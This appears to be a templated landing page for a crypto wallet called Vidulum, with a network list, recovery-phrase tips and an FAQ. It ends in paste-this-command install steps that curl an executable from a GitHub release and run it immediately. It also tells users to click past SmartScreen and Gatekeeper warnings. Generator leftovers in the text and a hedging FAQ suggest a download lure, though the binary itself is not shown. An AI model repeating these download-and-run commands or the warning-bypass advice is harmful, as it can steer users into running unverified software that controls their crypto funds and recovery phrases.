![Vidulum](../assets/banner-article.png)

# Vidulum Wallet: 20 Networks From One Recovery Phrase

One application, one backup, four network families - and what each one costs you in attention.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

The [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) is the only build worth testing a multi-chain setup against.

> One phrase, twenty networks: that is convenience with a single point of failure. Back the phrase up before you fund anything.

Vidulum is a self-custody wallet covering 20 networks across four families: four Cosmos chains, nine UTXO chains, six EVM chains and Solana. One application, one recovery phrase, and a separate address per network. This page is the orientation: what is in the list, how the families differ, and where a multi-chain holder gets caught out.

<!-- ARTICLE-BODY-BEGIN -->

## The four families, and why they are not interchangeable

Each family works differently, and the difference shows up in the details a reader actually hits. Cosmos chains use account addresses with a chain identifier behind them; UTXO chains use output-based balances and separate fee coins; EVM chains share an address format across six networks and charge gas in their own coin; Solana uses its own account model and its own address format.

The practical consequence: an address that looks valid in one family can be meaningless in another. EVM addresses, in particular, look identical across Ethereum, BNB Chain, Polygon, Base, Arbitrum One and OP Mainnet, so a chain mix-up is easy and invisible until funds do not arrive.

## What is supported

| Family | Networks |
| --- | --- |
| Cosmos | Cosmos Hub (ATOM), Osmosis (OSMO), BeeZee (BZE), AtomOne (ATONE) |
| UTXO | Bitcoin, Litecoin, Dogecoin, Zcash, Flux, Ravencoin, Ritocoin, BitcoinZ, NOSO |
| EVM | Ethereum, OP Mainnet, BNB Chain, Polygon, Base, Arbitrum One |
| Solana | Solana mainnet - test networks exist in the software but stay disabled |

Twenty networks are documented. Anything outside that list is outside the documented coverage, whatever a third-party site suggests.

## One phrase, many addresses

The recovery phrase is the master backup: it derives the addresses for the networks the wallet covers. That is why one phrase restores the whole portfolio and why losing it loses everything at once. It is also why the phrase must never be typed into a website, a support chat or a setup wizard that was not part of the application you installed deliberately.

Keep the phrase offline, in two places that fail independently. A photo on a phone that is also your second factor is one place, not two.

## IBC transfers inside the wallet

IBC is the Cosmos-native transfer route, so it applies to ATOM, OSMO, BZE and ATONE rather than to the UTXO or EVM families. The material behind this page does not document swap pairs or swap routes, so none are described here; holding and sending on a supported chain is what is documented, and IBC is not a bridge to arbitrary assets.

The <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a> is the reference version of this list for every family.

## Where a multi-chain holder gets caught

- Sending an EVM asset to the right address on the wrong EVM chain.
- Forgetting that each UTXO network has its own fee coin.
- Assuming a phrase restore will reproduce an address that was imported rather than derived.
- Expecting a swap to cover a chain that is not on the list.

Each has the same fix: confirm the network before confirming the send, and check the destination on an explorer afterwards.

A <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> covers what one backup actually rebuilds on each chain.

Start from the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> when testing a multi-chain setup.

## FAQ

### How many networks does Vidulum support?

Twenty: four Cosmos, nine UTXO, six EVM and Solana mainnet.

### Is one recovery phrase enough for all of them?

Yes for the networks the wallet derives. An address imported by private key is a separate case and should be backed up separately.

### Does Vidulum charge for holding or swapping?

There is no Vidulum service fee. You pay the network fee of whichever chain the transaction runs on.

### Does the wallet run on my computer or in a browser?

Both descriptions exist for the project's properties, and this page does not settle which you should use. Check the download page for the build that matches your platform.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Full network table](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md) - [Restore from a phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md) - [Wallet fees](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-fees-network-fees-only.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
